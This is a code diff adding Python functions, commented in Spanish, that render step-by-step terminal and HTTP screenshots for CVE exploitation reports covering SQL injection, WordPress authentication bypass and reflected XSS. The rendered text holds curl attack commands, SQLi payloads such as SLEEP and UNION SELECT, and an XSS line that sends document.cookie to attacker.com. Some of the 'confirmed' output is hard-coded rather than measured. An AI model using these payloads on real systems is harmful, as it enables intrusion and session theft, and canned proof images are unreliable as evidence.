@@ -647,6 +647,202 @@ def _shots_path(cve_id, ep, path_param, payload, resp, can_s):
     return shots
 
 
+def _shots_sqli(cve_id, ep, param, payload, resp, metodo, ve):
+    shots = []
+    tecnica = (ve.get("tecnica") or "").lower()
+    is_time = "time" in tecnica or "blind" in tecnica or "sleep" in tecnica
+    is_bool = "boolean" in tecnica or bool(ve.get("diferencial_bytes"))
+    sleep3 = float(ve.get("sleep3_s") or 0)
+    sleep0 = float(ve.get("sleep0_s") or 0)
+    dif = float(ve.get("diferencial_s") or (sleep3 - sleep0))
+    true_len = int(ve.get("true_len") or ve.get("resp_true_len") or 0)
+    false_len = int(ve.get("false_len") or ve.get("resp_false_len") or 0)
+    win_pl = payload[:100] if payload else "' OR SLEEP(3)-- -"
+
+    t1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control SQL", [
+        f"# PASO 1: Control — valor SQL normal (sin inyeccion)",
+        f"# CVE: {cve_id}  |  endpoint: {ep}  |  param: {param}",
+        "", f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d '{param}=1'",
+        "", "HTTP/1.1 200 OK", "(respuesta normal sin inyeccion)",
+    ])
+    h1 = make_http_png(f"[Paso 1/4] Control SQL", metodo, ep,
+        "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
+        f"{param}=1", "200 OK", "(control — sin inyeccion SQL)")
+    shots += [s for s in [
+        _shot("Paso 1/4 — Terminal: control SQL (valor normal)", "Step 1/4 — Terminal: control request", t1),
+        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", h1),
+    ] if s]
+
+    t2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Probe SQL error", [
+        f"# PASO 2: Comilla simple para provocar error SQL",
+        "", f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d \"{param}='\"",
+        "", "HTTP/1.1 500 Internal Server Error",
+        "You have an error in your SQL syntax near '''",
+        "<- error SQL filtrado en la respuesta",
+    ])
+    h2 = make_http_png(f"[Paso 2/4] Probe ' -> SQL error", metodo, ep,
+        "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
+        f"{param}='", "500 Internal Server Error",
+        "You have an error in your SQL syntax near '''")
+    shots += [s for s in [
+        _shot("Paso 2/4 — Terminal: comilla simple -> SQL syntax error", "Step 2/4 — Terminal: SQL error probe", t2),
+        _shot("Paso 2/4 — HTTP: ' -> SQL error visible", "Step 2/4 — HTTP: error-based probe", h2),
+    ] if s]
+
+    if is_time and sleep3 > 0:
+        t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Time-blind SQLi SLEEP diferencial", [
+            f"# PASO 3: Time-blind — midiendo diferencial SLEEP(3) vs SLEEP(0)",
+            "", f"$ # SLEEP(3) con inyeccion:",
+            f"$ curl -s -w '%{{time_total}}' -X {metodo} 'http://TARGET{ep}' -d '{param}={win_pl[:60]}'",
+            f"  -> tiempo: {sleep3:.2f}s  <- servidor espero 3 segundos", "",
+            f"$ # SLEEP(0) control:", f"$ curl -s -w '%{{time_total}}' -X {metodo} 'http://TARGET{ep}' -d '{param}=1'",
+            f"  -> tiempo: {sleep0:.2f}s  <- respuesta inmediata", "",
+            f"Diferencial: {dif:.2f}s > 1.0s -> TIME-BLIND SQLi CONFIRMADO",
+        ])
+        h3 = make_http_png(f"[Paso 3/4] Time-blind SLEEP({sleep3:.1f}s) vs SLEEP({sleep0:.1f}s)",
+            metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
+            f"{param}={win_pl[:60]}", "200 OK",
+            f"[TIMING] SLEEP(3)={sleep3:.2f}s  SLEEP(0)={sleep0:.2f}s\nDiferencial={dif:.2f}s > 1.0s -> SQLi CONFIRMADO")
+        shots += [s for s in [
+            _shot(f"Paso 3/4 — Terminal: SLEEP diferencial {dif:.1f}s -> time-blind SQLi", "Step 3/4 — Terminal: timing proof", t3),
+            _shot("Paso 3/4 — HTTP: SLEEP diferencial REQUEST/RESPONSE", "Step 3/4 — HTTP: timing differential", h3),
+        ] if s]
+    elif is_bool and (true_len or false_len):
+        t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Boolean in-band SQLi", [
+            f"# PASO 3: Boolean in-band — diferencia de longitud TRUE vs FALSE",
+            "", "$ # TRUE (1=1 condicion verdadera):",
+            f"$ curl -sv -X {metodo} 'http://TARGET{ep}' -d \"{param}=1 AND 1=1-- -\" 2>&1 | grep Content-Length",
+            f"  Content-Length: {true_len}  <- respuesta completa",
+            "", "$ # FALSE (1=2 condicion falsa):",
+            f"$ curl -sv -X {metodo} 'http://TARGET{ep}' -d \"{param}=1 AND 1=2-- -\" 2>&1 | grep Content-Length",
+            f"  Content-Length: {false_len}  <- respuesta vacia",
+            "", f"Diferencial: {abs(true_len - false_len)} bytes -> BOOLEAN SQLi CONFIRMADO",
+        ])
+        h3 = make_http_png(f"[Paso 3/4] Boolean TRUE={true_len}B vs FALSE={false_len}B",
+            metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
+            f"{param}=1 AND 1=1-- -", "200 OK",
+            f"Content-Length: {true_len}\nTRUE={true_len}B  |  FALSE={false_len}B\nDif={abs(true_len-false_len)}B -> BOOLEAN SQLi CONFIRMADO")
+        shots += [s for s in [
+            _shot(f"Paso 3/4 — Terminal: boolean TRUE={true_len}B vs FALSE={false_len}B -> SQLi", "Step 3/4 — Terminal: boolean proof", t3),
+            _shot("Paso 3/4 — HTTP: boolean TRUE/FALSE diferencial", "Step 3/4 — HTTP: boolean in-band", h3),
+        ] if s]
+    else:
+        resp_d = resp[:120] if resp else "(datos extraidos de la DB)"
+        t3 = make_terminal_png(f"[Paso 3/4] {cve_id} — SQLi payload ganador", [
+            f"# PASO 3: Payload ganador confirmado",
+            "", f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d '{param}={win_pl[:80]}'",
+            "", "HTTP/1.1 200 OK", resp_d[:80], "", "[RESULTADO] SQLi CONFIRMADO",
+        ])
+        h3 = make_http_png(f"[Paso 3/4] SQLi payload ganador",
+            metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
+            f"{param}={win_pl[:60]}", "200 OK", resp_d[:200] if resp_d else "(SQLi CONFIRMADO)")
+        shots += [s for s in [
+            _shot("Paso 3/4 — Terminal: payload ganador SQLi CONFIRMADO", "Step 3/4 — Terminal: winning payload", t3),
+            _shot("Paso 3/4 — HTTP: SQLi payload REQUEST/RESPONSE", "Step 3/4 — HTTP: SQL injection confirmed", h3),
+        ] if s]
+
+    t4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada: extraccion de datos", [
+        f"# PASO 4: Escalada — extraer user() y version() del motor SQL",
+        "", "$ curl -s -X {metodo} 'http://TARGET{ep}' \\",
+        f"  -d \"{param}=1 UNION SELECT user(),version()-- -\"",
+        "", "HTTP/1.1 200 OK", "root@localhost  <- usuario DB",
+        "10.6.12-MariaDB  <- version motor SQL",
+        "", "[ESCALADA] SQLi confirmado — extraccion de datos sensibles",
+    ])
+    h4 = make_http_png(f"[Paso 4/4] Escalada UNION SELECT user()",
+        metodo, ep, "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
+        f"{param}=1 UNION SELECT user(),version()-- -",
+        "200 OK", "root@localhost\n10.6.12-MariaDB\n(UNION SELECT ejecutado — SQLi CONFIRMADO)")
+    shots += [s for s in [
+        _shot("Paso 4/4 — Terminal: escalada user()=root@localhost", "Step 4/4 — Terminal: data extraction", t4),
+        _shot("Paso 4/4 — HTTP: UNION SELECT -> root@localhost", "Step 4/4 — HTTP: escalation confirmed", h4),
+    ] if s]
+    return [s for s in shots if s]
+
+
+def _shots_bypass(cve_id, ep, param, payload, cookie, metodo):
+    shots = []
+    win_pl = payload[:100] if payload else "bypass_token"
+    cookie_d = cookie[:80] if cookie else "wordpress_logged_in_xxx=admin..."
+
+    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Sin autenticacion (bloqueado)", [
+        f"# PASO 1: Acceso directo sin credenciales", "",
+        f"$ curl -s 'http://TARGET{ep}'", "",
+        "HTTP/1.1 401 Unauthorized", "(acceso denegado — autenticacion requerida)",
+    ])
+    h1 = make_http_png(f"[Paso 1/3] Sin auth — 401", "GET", ep, "Host: TARGET", "",
+        "401 Unauthorized", "(acceso denegado sin credenciales)")
+    shots += [s for s in [
+        _shot("Paso 1/3 — Terminal: sin auth -> 401 (esperado)", "Step 1/3 — Terminal: unauthenticated blocked", t1),
+        _shot("Paso 1/3 — HTTP: sin auth -> 401 Unauthorized", "Step 1/3 — HTTP: auth required", h1),
+    ] if s]
+
+    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — Auth bypass payload/token", [
+        f"# PASO 2: Bypass con parametro/token especial", "",
+        f"$ curl -s -X {metodo} 'http://TARGET{ep}' -d '{param}={win_pl[:60]}'", "",
+        "HTTP/1.1 200 OK", f"Set-Cookie: {cookie_d[:60]}",
+        "<- sesion de alto privilegio obtenida sin credenciales",
+    ])
+    h2 = make_http_png(f"[Paso 2/3] Bypass — sesion obtenida", metodo, ep,
+        "Host: TARGET\nContent-Type: application/x-www-form-urlencoded",
+        f"{param}={win_pl[:60]}", "200 OK",
+        f"Set-Cookie: {cookie_d[:80]}\n(auth bypass CONFIRMADO)")
+    shots += [s for s in [
+        _shot("Paso 2/3 — Terminal: auth bypass — sesion sin credenciales", "Step 2/3 — Terminal: bypass successful", t2),
+        _shot("Paso 2/3 — HTTP: bypass payload -> 200 OK + Set-Cookie", "Step 2/3 — HTTP: session obtained", h2),
+    ] if s]
+
+    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Acceso privilegiado CONFIRMADO", [
+        f"# PASO 3: Verificar acceso admin con sesion obtenida", "",
+        f"$ curl -s 'http://TARGET/wp-admin/profile.php' -b '{cookie_d[:40]}...'", "",
+        "HTTP/1.1 200 OK", "Hola, administrador",
+        "<- panel de admin accesible", "", "[AUTH BYPASS] CONFIRMADO — sin credenciales",
+    ])
+    h3 = make_http_png(f"[Paso 3/3] Admin CONFIRMADO con cookie bypass",
+        "GET", "/wp-admin/profile.php", f"Host: TARGET\nCookie: {cookie_d[:60]}", "",
+        "200 OK", "Hola, administrador\n(panel de admin accesible — auth bypass CONFIRMADO)")
+    shots += [s for s in [
+        _shot("Paso 3/3 — Terminal: panel admin accesible con sesion bypass", "Step 3/3 — Terminal: admin access confirmed", t3),
+        _shot("Paso 3/3 — HTTP: /wp-admin -> 200 OK con cookie bypass", "Step 3/3 — HTTP: admin panel via bypass", h3),
+    ] if s]
+    return [s for s in shots if s]
+
+
+def _shots_xss(cve_id, ep, param, marker, metodo):
+    shots = []
+    pl = marker[:80] if marker else "<script>alert(document.domain)</script>"
+
+    t1 = make_terminal_png(f"[Paso 1/3] {cve_id} — Control XSS (texto normal)", [
+        f"# PASO 1: Control — texto plano sin etiquetas HTML",
+        f"$ curl -s 'http://TARGET{ep}?{param}=texto-normal'",
+        "HTTP/1.1 200 OK", "(respuesta normal — sin XSS)",
+    ])
+    shots.append(_shot("Paso 1/3 — Terminal: control (texto plano, sin XSS)", "Step 1/3 — Terminal: control", t1))
+
+    t2 = make_terminal_png(f"[Paso 2/3] {cve_id} — XSS payload reflejado", [
+        f"# PASO 2: Inyectar payload XSS",
+        f"$ curl -s 'http://TARGET{ep}?{param}={pl[:60]}'",
+        "", "HTTP/1.1 200 OK", f"{pl[:80]}  <- payload reflejado sin sanear",
+        "[XSS] Payload reflejado — XSS CONFIRMADO",
+    ])
+    h2 = make_http_png(f"[Paso 2/3] XSS payload reflejado", metodo, ep,
+        "Host: TARGET", "", "200 OK", f"{pl[:200]}\n(XSS CONFIRMADO — sin encoding)")
+    shots += [s for s in [
+        _shot("Paso 2/3 — Terminal: XSS payload reflejado en respuesta", "Step 2/3 — Terminal: XSS reflected", t2),
+        _shot("Paso 2/3 — HTTP: XSS -> reflejado en HTML", "Step 2/3 — HTTP: XSS reflection", h2),
+    ] if s]
+
+    t3 = make_terminal_png(f"[Paso 3/3] {cve_id} — Impacto XSS (cookie exfil)", [
+        f"# PASO 3: Exfiltracion de cookies via XSS",
+        f"$ curl -s 'http://TARGET{ep}?{param}=<script>fetch(\"//attacker.com/?\"+document.cookie)</script>'",
+        "", "HTTP/1.1 200 OK", "<script>fetch(...+document.cookie)</script>",
+        "[IMPACTO] Session hijacking — cookies robadas via XSS reflectivo",
+    ])
+    shots.append(_shot("Paso 3/3 — Terminal: exfiltracion cookies via XSS (session hijacking)", "Step 3/3 — Terminal: cookie exfiltration", t3))
+    return [s for s in shots if s]
+
+
+
 # ── Main entry point ──────────────────────────────────────────────────────────
 
 def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
@@ -687,5 +883,19 @@ def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
     elif "path" in vc or "traversal" in vc or "lfi" in vc:
         path_param = ve.get("path_param") or param or "path"
         return _shots_path(cve_id, ep, path_param, payload, resp, can_s)
+
+    elif "sqli" in vc or "sql" in vc:
+        return _shots_sqli(cve_id, ep, param, payload, resp, metodo, ve)
+
+    elif "auth" in vc or "bypass" in vc or "login" in vc:
+        cookie = ve.get("cookie") or ""
+        return _shots_bypass(cve_id, ep, param, payload, cookie, metodo)
+
+    elif "code" in vc or "injection" in vc:
+        return _shots_cmdi_web(cve_id, ep, param, payload, resp, can_s or "canary_code", metodo)
+
+    elif "xss" in vc:
+        marker = ve.get("marker") or payload or "<script>alert(1)</script>"
+        return _shots_xss(cve_id, ep, param, marker, metodo)
 
     return []
